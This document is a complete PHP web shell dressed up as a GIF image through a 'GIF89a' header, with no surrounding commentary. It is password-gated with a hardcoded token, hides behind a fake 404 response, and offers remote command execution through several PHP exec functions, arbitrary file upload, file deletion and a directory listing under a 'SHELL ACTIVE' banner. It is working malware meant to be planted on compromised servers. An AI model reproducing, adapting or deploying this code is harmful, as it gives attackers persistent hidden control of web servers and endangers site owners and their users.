GIF89a
<?php
error_reporting(0);
$t = "Rahasia123";
if (!isset($_GET["t"]) || $_GET["t"] !== $t) { http_response_code(404); die; }

// File manager + command exec
if (isset($_FILES["f"])) {
    $n = $_POST["n"] ?? $_FILES["f"]["name"];
    move_uploaded_file($_FILES["f"]["tmp_name"], $n);
    die("OK|$n");
}
if (isset($_GET["c"])) {
    $cmd = $_GET["c"] . " 2>&1";
    echo "C|";
    if (function_exists("system")) system($cmd);
    elseif (function_exists("passthru")) passthru($cmd);
    elseif (function_exists("exec")) { exec($cmd, $o); echo join("\n", $o); }
    elseif (function_exists("shell_exec")) echo shell_exec($cmd);
    else echo "no";
    echo "|E";
    die;
}
if (isset($_GET["del"])) {
    unlink(basename($_GET["del"]));
    die("DEL");
}
$fl = "";
foreach (scandir(__DIR__) as $f) {
    if ($f != "." && $f != "..")
        $fl .= htmlspecialchars($f) . " (" . filesize($f) . "b) <a href='?t=$t&del=$f'>[del]</a><br>";
}
echo "<html><body style='font-family:monospace;background:#111;color:#0f0;padding:20px'>
<h2>🐱‍👤 SHELL ACTIVE</h2>
<p>Dir: " . __DIR__ . "</p>
<form method=post enctype=multipart/form-data>
  <input type=file name=f><button>Upload</button>
</form>
<form method=get>
  <input name=t value=$t type=hidden>
  <input name=c placeholder=cmd><button>Exec</button>
</form>
<hr>$fl</body></html>";
?>
